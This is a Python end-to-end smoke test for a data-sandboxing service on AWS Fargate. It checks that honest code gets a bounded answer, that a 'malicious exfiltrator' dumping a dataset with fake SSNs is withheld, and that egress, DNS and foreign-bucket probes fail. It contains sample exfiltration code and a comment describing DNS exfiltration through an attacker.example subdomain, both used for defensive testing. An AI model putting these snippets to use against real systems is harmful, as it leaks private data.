"""End-to-end cloud smoke test: run an honest and a hostile program on real Fargate.

Reads deployment coordinates from the environment (populated from `terraform output`) and runs
three programs against the same private dataset:
  1. honest classifier   -> a bounded, attested answer is released
  2. malicious exfiltrator -> nothing is released (structurally withheld), yet still attested
  3. egress probe        -> proves the box has no internet path (returns False, released)

Requires the `cloud` extra (boto3) and AWS credentials. Invoked by the M5 verification flow.
"""

from __future__ import annotations

import os
import sys

from keyhole.attest.keys import load_or_create_dev_signer
from keyhole.attest.verify import verify_attestation
from keyhole.common.config import dev_pubkey_path
from keyhole.common.models import Limits, RunRequest
from keyhole.controlplane.cloud_runner import CloudConfig, run_cloud
from keyhole.schema.spec import OutputSchema, SchemaType

DATASET = "\n".join(f"user{i},{i}@corp.example,ssn=123-45-{i:04d}" for i in range(300))
SCHEMA = OutputSchema(type=SchemaType.ENUM, choices=["spam", "ham", "other"])

HONEST = """
import os, json
rows = open("customers.csv").read().splitlines()
label = "spam" if len(rows) > 100 else "ham"
json.dump(label, open(os.environ["KEYHOLE_OUTPUT"], "w"))
"""

MALICIOUS = """
import os, json
json.dump(open("customers.csv").read(), open(os.environ["KEYHOLE_OUTPUT"], "w"))
"""

# Attempts real internet egress from inside the box; reports honestly whether it got out.
# In the contained subnet (no NAT, endpoints-only SG) this must release False.
EGRESS_PROBE = """
import os, json, socket
try:
    socket.create_connection(("example.com", 443), timeout=5)
    reached = True
except OSError:
    reached = False
json.dump(reached, open(os.environ["KEYHOLE_OUTPUT"], "w"))
"""

BOOL_SCHEMA = OutputSchema(type=SchemaType.BOOLEAN)

# Can the box resolve public names? If so, every lookup of <data>.attacker.example carries data out
# through the VPC resolver, with no internet route needed. Must release False.
DNS_PROBE = """
import os, json, socket
try:
    socket.getaddrinfo("example.com", 443)
    resolved = True
except OSError:
    resolved = False
json.dump(resolved, open(os.environ["KEYHOLE_OUTPUT"], "w"))
"""

# Can the box write to a bucket that is not ours? The URL is a presigned PUT the attacker made for
# their own bucket (KEYHOLE_FOREIGN_PUT_URL). Must release False.
FOREIGN_BUCKET_PROBE = """
import os, json, urllib.request
try:
    req = urllib.request.Request(%r, data=b"exfil", method="PUT")
    urllib.request.urlopen(req, timeout=10)
    wrote = True
except Exception:
    wrote = False
json.dump(wrote, open(os.environ["KEYHOLE_OUTPUT"], "w"))
"""


def _config() -> CloudConfig:
    missing = [
        k
        for k in ("KEYHOLE_REGION", "KEYHOLE_CLUSTER", "KEYHOLE_TASK_DEF", "KEYHOLE_SUBNET", "KEYHOLE_SG", "KEYHOLE_BUCKET")
        if not os.environ.get(k)
    ]
    if missing:
        sys.exit(f"missing env: {', '.join(missing)} (populate from `terraform output`)")
    return CloudConfig(
        region=os.environ["KEYHOLE_REGION"],
        cluster=os.environ["KEYHOLE_CLUSTER"],
        task_definition=os.environ["KEYHOLE_TASK_DEF"],
        subnet_id=os.environ["KEYHOLE_SUBNET"],
        security_group_id=os.environ["KEYHOLE_SG"],
        bucket=os.environ["KEYHOLE_BUCKET"],
    )


def _run(name: str, code: str, config: CloudConfig, schema: OutputSchema = SCHEMA):
    signer = load_or_create_dev_signer()
    req = RunRequest(
        code=code, data={"customers.csv": DATASET}, output_schema=schema, limits=Limits(timeout_seconds=60)
    )
    outcome, task_arn = run_cloud(req, config, signer)
    r = outcome.result
    verified = verify_attestation(outcome.attestation, dev_pubkey_path().read_bytes())
    print(f"\n[{name}]  task={task_arn.rsplit('/', 1)[-1]}")
    print(f"  status:      {r.status.value}")
    print(f"  output:      {r.output!r}")
    if r.withheld_reason:
        print(f"  withheld:    {r.withheld_reason}")
    print(f"  bandwidth:   {r.exit_bandwidth_bits:.2f} bits")
    print(f"  attestation: {r.attestation_id} (signature {'VALID' if verified else 'INVALID'})")
    return r


def main() -> int:
    config = _config()
    print(f"Cloud smoke test on Fargate (cluster={config.cluster}, region={config.region})")
    honest = _run("honest classifier", HONEST, config)
    hostile = _run("malicious exfiltrator", MALICIOUS, config)
    probe = _run("egress probe (expects False)", EGRESS_PROBE, config, schema=BOOL_SCHEMA)
    dns = _run("DNS probe (expects False)", DNS_PROBE, config, schema=BOOL_SCHEMA)
    probes = [probe, dns]
    foreign = os.environ.get("KEYHOLE_FOREIGN_PUT_URL")
    if foreign:
        probes.append(_run("foreign-bucket probe (expects False)",
                           FOREIGN_BUCKET_PROBE % foreign, config, schema=BOOL_SCHEMA))
    else:
        print("\n[foreign-bucket probe] skipped: set KEYHOLE_FOREIGN_PUT_URL to a presigned PUT "
              "for a bucket you own in the same region")

    ok = (
        honest.status.value == "succeeded"
        and hostile.status.value == "withheld"
        # Each probe must SUCCEED (a boolean is conforming) with output False:
        # the network, not the gate, is what stops egress.
        and all(p.status.value == "succeeded" and p.output is False for p in probes)
    )
    print("\nRESULT:", "PASS ✓" if ok else "FAIL ✗")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
